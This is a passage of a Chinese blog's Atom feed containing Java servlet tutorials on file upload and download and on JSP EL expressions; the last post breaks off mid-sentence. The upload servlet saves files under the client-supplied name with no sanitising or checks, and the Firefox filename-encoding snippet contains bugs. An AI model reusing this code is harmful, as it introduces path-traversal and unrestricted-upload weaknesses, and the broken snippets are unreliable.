    <summary type="html">&lt;h2 id=&quot;Cookie&quot;&gt;&lt;a href=&quot;#Cookie&quot; class=&quot;headerlink&quot; title=&quot;Cookie&quot;&gt;&lt;/a&gt;Cookie&lt;/h2&gt;&lt;h3 id=&quot;创建-Cookie&quot;&gt;&lt;a href=&quot;#创建-Cookie&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="Cookie" scheme="https://xorex.space/tags/Cookie/"/>
    
    <category term="Session" scheme="https://xorex.space/tags/Session/"/>
    
  </entry>
  
  <entry>
    <title>文件上传与下载</title>
    <link href="https://xorex.space/2021/04/03/8fbbcc5007bc/"/>
    <id>https://xorex.space/2021/04/03/8fbbcc5007bc/</id>
    <published>2021-04-03T09:43:24.000Z</published>
    <updated>2021-04-03T11:59:23.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="前端部分"><a href="#前端部分" class="headerlink" title="前端部分"></a>前端部分</h3><p>首先我们写一个文件上传的表单页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;Upload&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;photo&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span> <span class="comment">&lt;!-- 这里要注意一定要写 name 属性，否则数据不会提交到 Post 里面 --&gt;</span></span><br><span class="line">    用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当我们使用表单进行传输数据的时候，需要设定属性 <code>enctype=&quot;multipart/form-data&quot;</code> 这是因为对于文件来说，不能像 <code>XXX=XXX&amp;XXX=XXX</code> 这样的 Post 方式传送信息，所以需要使用 multipart 多块传送，将每一组信息都放到一个数据块里面提交。</p><p>这个表单有着血泪史，一定要记得在提交数据的时候一定要些 name 属性，不然组不成 <code>name=value</code> 的格式，就没有办法用 Post 传输数据。然后点击这个表单上传文件并提交之后，我们来看看发出来的 HTTP 请求：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://localhost:8080/BookStore/Upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------16694935940386624681704157384</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36544</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:8080</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8080/BookStore/test.jsp</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=36C32D4D34BDD9D1138C898DA0C86440; Idea-b21bbe90=38338ff0-a6c6-49f8-b92a-980001c9c1a6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line">-----------------------------16694935940386624681704157384</span><br><span class="line">Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;.......jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">.PNG</span><br><span class="line">.</span><br><span class="line">....IHDR.......m......E.... .IDATx^.....E..;&quot;....@...C.....</span><br><span class="line">....h,...</span><br><span class="line">.&amp;.&quot;&quot;.]Y@...Q.(.`...rD...a.v.%x....,.%..d.r.D.C..=.._;....y.&#123;f...T................./.d. ...@...... ...@...&amp;!.&#123;=.....@...... ...@ #.8.</span><br><span class="line">-----------------------------16694935940386624681704157384</span><br><span class="line">Content-Disposition: form-data; name=&quot;username&quot;</span><br><span class="line"></span><br><span class="line">Xorex</span><br><span class="line">-----------------------------16694935940386624681704157384</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">............</span><br><span class="line">-----------------------------16694935940386624681704157384--</span><br></pre></td></tr></table></figure><p>然后我们来分析一波，下面这个头表示用表单设置出来的，不同的是多了一个 boundary 属性，是浏览器自己生成的随机数分割线，用来分隔 POST 传送的不同的数据块的。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=---------------------------16694935940386624681704157384</span><br></pre></td></tr></table></figure><p>然后，这个是图片数据块的开头，标识数据名 <code>name=&quot;photo&quot;</code> 和文件名 <code>filename=&quot;.......jpg&quot;</code> （这里因为编码原因无法显示），然后下面的 <code>Content-Type: image/jpeg</code> 作为请求头组成之一标识这个数据块的数据类型为图片，且是 jpeg 格式。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------16694935940386624681704157384</span><br><span class="line">Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;.......jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure><p>设置好了前端的文件上传的数据发送，就要设置好后端的数据接收。</p><h4 id="后端部分"><a href="#后端部分" class="headerlink" title="后端部分"></a>后端部分</h4><p>这里需要导入两个 Maven 依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的处理思路主要是先判断是否是 Multipart 类型的数据，如果是则进行处理。然后用 ServletFileUpload 的实例去解析 request 请求里面的数据块，它会将所有的数据块都解析成一个 FileItem 实例，然后封装成一个 List 之后传出来。我们遍历所有的数据块 FileItem ，然后选取不是来自于 Filed 的普通文字标段字段（也就是文件啦），去把这个文件里面的所有内容写入一个 File 里面即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadService</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ServletFileUpload.isMultipartContent(req)) &#123;</span><br><span class="line">            FileItemFactory fileItemFactory=<span class="keyword">new</span> DiskFileItemFactory(); <span class="comment">// 创建工厂实例</span></span><br><span class="line">            ServletFileUpload servletFileUpload=<span class="keyword">new</span> ServletFileUpload(fileItemFactory); <span class="comment">//传入工厂创建文件上传处理的实例</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                List&lt;FileItem&gt; list = servletFileUpload.parseRequest(req); <span class="comment">//解析请求里面的数据块</span></span><br><span class="line">                <span class="keyword">for</span>(FileItem i:list) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(!i.isFormField()) &#123; <span class="comment">//如果不是文本字段，就一定是文件了</span></span><br><span class="line">                        i.write(<span class="keyword">new</span> File(<span class="string">&quot;E:/&quot;</span>+i.getName())); <span class="comment">//将文件内容原封不动写入 File 中</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line">            PrintWriter writer = resp.getWriter();</span><br><span class="line">            writer.println(<span class="string">&quot;&lt;h1&gt;上传失败哦&lt;/h1&gt;&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;Refresh&quot;</span>, <span class="string">&quot;5; url=/BookStore/test.jsp&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><h3 id="Servlet-编写"><a href="#Servlet-编写" class="headerlink" title="Servlet 编写"></a>Servlet 编写</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadService</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String downloadName=<span class="string">&quot;waifu.jpg&quot;</span>; <span class="comment">//设置需要传给客户端的文件名</span></span><br><span class="line">        ServletContext context=getServletContext(); <span class="comment">//获取 ServletContext 实例</span></span><br><span class="line">        String MimeType=context.getMimeType(<span class="string">&quot;/static/img/&quot;</span>+downloadName); <span class="comment">//获取文件的 MIME 值，用于告诉客户端文件类型</span></span><br><span class="line">        resp.setContentType(MimeType); <span class="comment">//将 MIME 添加到响应头</span></span><br><span class="line">        resp.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; fileName=&quot;</span>+downloadName); <span class="comment">//添加响应头，告诉浏览器要下载附件</span></span><br><span class="line">        InputStream inputStream=context.getResourceAsStream(<span class="string">&quot;/static/img/&quot;</span>+downloadName); <span class="comment">//获取文件的流资源</span></span><br><span class="line">        OutputStream outputStream=resp.getOutputStream(); <span class="comment">//获取输出流</span></span><br><span class="line">        IOUtils.copy(inputStream, outputStream); <span class="comment">//将文件流资源拷贝到输出流中</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="乱码处理"><a href="#乱码处理" class="headerlink" title="乱码处理"></a>乱码处理</h3><p>因为 HTTP 协议在设计的时候就没有考虑到中文的问题，所以就有可能会出现中文文件名乱码。对于访问的客户端我们可以分为火狐浏览器和非火狐浏览器，对于非火狐浏览器，我们只需要对涉及到中文的地方进行 URL 编码即可，浏览器会自动对 URL 编码进行 URL 解码和 UTF-8 解码获取中文：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadService</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String downloadName=<span class="string">&quot;Waifu.jpg&quot;</span>;</span><br><span class="line">        ServletContext context=getServletContext();</span><br><span class="line">        String MimeType=context.getMimeType(<span class="string">&quot;/static/img/&quot;</span>+downloadName);</span><br><span class="line">        resp.setContentType(MimeType);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; fileName=内存.jpg&quot;</span>+URLEncoder.encode(<span class="string">&quot;内存.jpg&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>)); <span class="comment">//对文件名进行 UTF-8 方式的 URL 编码</span></span><br><span class="line">        InputStream inputStream=context.getResourceAsStream(<span class="string">&quot;/static/img/&quot;</span>+downloadName);</span><br><span class="line">        OutputStream outputStream=resp.getOutputStream();</span><br><span class="line">        IOUtils.copy(inputStream, outputStream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于火狐浏览器，就需要对文件名进行更特殊的编码了，格式为：<code>=?charset?B?XXXX?=</code>。其中 <code>=?</code> 和 <code>?=</code> 本别标识开始和结束，<code>charset</code> 表示字符的编码方式，<code>B</code> 表示使用 Base64 编码（因为火狐默认用的 Base64 解码后面的东西），<code>XXXX</code> 表示我们用 Base64 加密的 UTF-8 汉字。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadService</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String returnName;</span><br><span class="line">        <span class="keyword">if</span>(req.getHeader(<span class="string">&quot;User-Agent&quot;</span>).contains(<span class="string">&quot;FireFox&quot;</span>)) &#123;</span><br><span class="line">            returnName=<span class="string">&quot;=?utf-8?B?&quot;</span>+String.valueOf(Base64.getEncoder().encode(<span class="string">&quot;内存.jpg&quot;</span>.getBytes(StandardCharsets.UTF_8)))+<span class="string">&quot;?=&quot;</span>;</span><br><span class="line">            System.out.println(returnName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            returnName=URLEncoder.encode(<span class="string">&quot;内存.jpg&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String downloadName=<span class="string">&quot;Waifu.jpg&quot;</span>;</span><br><span class="line">        ServletContext context=getServletContext();</span><br><span class="line">        String MimeType=context.getMimeType(<span class="string">&quot;/static/img/&quot;</span>+downloadName);</span><br><span class="line">        resp.setContentType(MimeType);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; fileName=&quot;</span>+returnName);</span><br><span class="line">        InputStream inputStream=context.getResourceAsStream(<span class="string">&quot;/static/img/&quot;</span>+downloadName);</span><br><span class="line">        OutputStream outputStream=resp.getOutputStream();</span><br><span class="line">        IOUtils.copy(inputStream, outputStream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件上传&quot;&gt;&lt;a href=&quot;#文件上传&quot; class=&quot;headerlink&quot; title=&quot;文件上传&quot;&gt;&lt;/a&gt;文件上传&lt;/h2&gt;&lt;h3 id=&quot;前端部分&quot;&gt;&lt;a href=&quot;#前端部分&quot; class=&quot;headerlink&quot; title=&quot;前端部分&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="Upload" scheme="https://xorex.space/tags/Upload/"/>
    
    <category term="Download" scheme="https://xorex.space/tags/Download/"/>
    
  </entry>
  
  <entry>
    <title>EL &amp; JSTL</title>
    <link href="https://xorex.space/2021/04/02/b84810808110/"/>
    <id>https://xorex.space/2021/04/02/b84810808110/</id>
    <published>2021-04-02T13:12:15.000Z</published>
    <updated>2021-04-03T09:45:39.132Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EL"><a href="#EL" class="headerlink" title="EL"></a>EL</h2><blockquote><p>EL 全程为 Expression Language 的意思，是在 JSP 中用来代替表达式 <code>&lt;%=Expression%&gt;</code> 的，格式为 <code>$&#123;Expression&#125;</code> 。</p></blockquote><h3 id="获取并输出数据"><a href="#获取并输出数据" class="headerlink" title="获取并输出数据"></a>获取并输出数据</h3><h4 id="获取作用域变量"><a href="#获取作用域变量" class="headerlink" title="获取作用域变量"></a>获取作用域变量</h4><p>EL 可以直接将四大作用域的里面设置的属性作为一个变量直接输出，首先设置：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    pageContext.setAttribute(<span class="string">&quot;Tempest&quot;</span>, <span class="string">&quot;Xorex&quot;</span>);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;Yukinoshita&quot;</span>, <span class="string">&quot;Yukino&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;Yuuki&quot;</span>, <span class="string">&quot;Ausna&quot;</span>);</span><br><span class="line">    application.setAttribute(<span class="string">&quot;Katou&quot;</span>, <span class="string">&quot;Megumi&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>然后利用 EL 进行输出：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#123;Tempest&#125;</span><br><span class="line">$&#123;Yukinoshita&#125;</span><br><span class="line">$&#123;Yuuki&#125;</span><br><span class="line">$&#123;Katou&#125;</span><br></pre></td></tr></table></figure><p>而 EL 获取数据的实现原理是调用 <code>pageContext.findAttribute()</code>，然后分别按照作用域从小到大从  pageContex、request、session 和 application 作用域中搜索属性对应的名字，如果没有搜索到，会返回一个空串 “” 而不是 null（客户又看不懂 null 的意思，直接为空更好）。</p><h4 id="获取-JavaBean-属性"><a href="#获取-JavaBean-属性" class="headerlink" title="获取 JavaBean 属性"></a>获取 JavaBean 属性</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ID;</span><br><span class="line">String Name;</span><br><span class="line"><span class="keyword">short</span>[] scores;</span><br><span class="line">List&lt;String&gt; Address;</span><br><span class="line">Map&lt;String ,String&gt; Love;</span><br></pre></td></tr></table></figure><p>我们设置成功之后，需要将这个 JavaBean 对象放到任何一个作用域中（本地变量无效理由如上 EL 实现原理），访问 JavaBean 中的数据使用 <code>.DataName</code> ，这里的访问等价于 <code>.getDataName()</code>。（其实本质上调用的也是 get 方法），其实理论上无论什么类型的类，只要有合乎规范的 <code>getXXX()</code> 方法，在 EL 中就能通过 <code>.XXX</code> 的方式调用这个方法，获取其返回值。（当然上面是有一个比较特殊的存在就是对于 boolean 类型的获取的方法是 <code>isXXX()</code> 但是同样可以使用 <code>.XXX</code> 来进行访问。）</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;bean.ID&#125; &lt;%-- 这里就等价于输出 bean.getID() --%&gt;</span><br></pre></td></tr></table></figure><h4 id="获取-List-元素"><a href="#获取-List-元素" class="headerlink" title="获取 List 元素"></a>获取 List 元素</h4><p>List 获取到 List 的对象之后，可以使用 List 自带的 <code>get(int index)</code> 或者使用 <code>[index]</code> 下标来获取某个具体 index 的元素。</p><p>下面两者效果相同：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;bean.address[<span class="number">0</span>]&#125; &lt;br&gt;</span><br><span class="line">$&#123;bean.address.get(<span class="number">0</span>)&#125; &lt;br&gt;</span><br></pre></td></tr></table></figure><h4 id="获取-Map-元素"><a href="#获取-Map-元素" class="headerlink" title="获取 Map 元素"></a>获取 Map 元素</h4><p>下面是一个 JavaBean 的 Map 实例获取映射的方法，下面三种方法完全等效。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;bean.love[<span class="string">&quot;Tempest&quot;</span>]&#125; &lt;br&gt;</span><br><span class="line">$&#123;bean.love.Tempest&#125; &lt;br&gt;</span><br><span class="line">$&#123;bean.love.get(<span class="string">&quot;Tempest&quot;</span>)&#125; &lt;br&gt;</span><br></pre></td></tr></table></figure><h3 id="执行运算"><a href="#执行运算" class="headerlink" title="执行运算"></a>执行运算</h3><h4 id="关系运算"><a href="#关系运算" class="headerlink" title="关系运算"></a>关系运算</h4><p>看图，输出内容是 boolean 的 true 或 false 的字符串：</p><p><img src="https://xorex.space/image/210.jpg"></p><h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><p>看图，输出内容是 boolean 的 true 或 false ：</p><p><img src="https://xorex.space/image/211.jpg"></p><h4 id="empty"><a href="#empty" class="headerlink" title="empty()"></a>empty()</h4><p>判断被传入的对象是否为 null，如果是返回 true 否则返回 false。</p><h4 id="表达式运算"><a href="#表达式运算" class="headerlink" title="表达式运算"></a>表达式运算</h4><p>传入一个表达式，会自动计算表达式的值，然后输出结果，不解释了。</p><h4 id="三元表达式"><a href="#三元表达式" class="headerlink" title="三元表达式"></a>三元表达式</h4><p><code>Expression ? Statement : Statement</code> 可以使用这玩意，不解释了。</p><h3 id="EL-中隐含对象"><a href="#EL-中隐含对象" class="headerlink" title="EL 中隐含对象"></a>EL 中隐含对象</h3><p>因为 EL 是专门用来代替 <code>&lt;%=Expression%&gt;</code> 的，尤其是处理在四大作用域里面存储的 Map 属性映射。除了我们直接按照作用域范围从小到大去使用 name 值检索其映射的 value 以外，还可以直接获取对应作用域范围里面的隐含 Map 对象来操作：</p><table><thead><tr><th>序号</th><th>隐含对象名称</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>pageContext</td><td>对应于 JSP 页面中的 pageContext 对象（注意：取的是 pageContext 对象。）</td></tr><tr><td>2</td><td>pageScope</td><td>代表 page 域中用于保存属性的 Map 对象</td></tr><tr><td>3</td><td>requestScope</td><td>代表 request 域中用于保存属性的 Map 对象</td></tr><tr><td>4</td><td>sessionScope</td><td>代表 session 域中用于保存属性的 Map 对象</td></tr><tr><td>5</td><td>applicationScope</td><td>代表 application 域中用于保存属性的 Map 对象</td></tr><tr><td>6</td><td>param</td><td>表示一个保存了所有请求参数的 Map 对象</td></tr><tr><td>7</td><td>paramValues</td><td>表示一个保存了所有请求参数的 Map 对象，它对于某个请求参数，返回的是一个 string[]</td></tr><tr><td>8</td><td>header</td><td>表示一个保存了所有 http 请求头字段的 Map 对象，注意：如果头里面有“-” ，例 Accept-Encoding，则要 header[“Accept-Encoding”]</td></tr><tr><td>9</td><td>headerValues</td><td>表示一个保存了所有 http 请求头字段的 Map 对象，它对于某个请求参数，返回的是一个 string[] 数组。注意：如果头里面有 “-“ ，例 Accept-Encoding，则要 headerValues[“Accept-Encoding”]</td></tr><tr><td>10</td><td>cookie</td><td>表示一个保存了所有 cookie 的 Map 对象</td></tr><tr><td>11</td><td>initParam</td><td>表示一个保存了所有 web 应用初始化参数的 map 对象</td></tr></tbody></table><h4 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h4><ol><li><p>不可以用上面返回的 Map 对象来向里面改动里面的映射，也就是说，只能读不能写。</p></li><li><p>对于获取有特殊字符的键值对映射，不可以使用 <code>.Key-Name</code> ，老老实实 <code>[&quot;Key-Name&quot;]</code> 吧，尤其是在获取请求头的时候，这种情况比较多。</p></li></ol><h4 id="pageContext-对象"><a href="#pageContext-对象" class="headerlink" title="pageContext 对象"></a>pageContext 对象</h4><p>这个对象就是 Servlet 里面的 PageContext 的对象，可以获取 JSP 内置的其他八大对象，所以这个东西在 EL 的意义就是获取其他对象来获取大量的页面信息，如：</p><p>访问协议、服务器 IP、服务器端口、工程路径、会话 ID、客户端 IP 等等，当中都是借助它保存的其他八大对象来获取的。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.request.scheme&#125;</span><br><span class="line">$&#123;pageContext.request.serverName&#125;</span><br><span class="line">$&#123;pageContext.request.serverPort&#125;</span><br></pre></td></tr></table></figure><h4 id="Values-系列"><a href="#Values-系列" class="headerlink" title="Values 系列"></a>Values 系列</h4><p>里面获取的 Map 里面提到了有 <code>&lt;String,Stirng[]&gt;</code> 这样映射方式的，就是后缀带 Values 的。主要是为了应对有一个对应多个的映射，比如 checkbox 多选框等等，所以返回一个 String[] 数组方便处理，如果是用 <code>&lt;String,String&gt;</code> 映射的 Map 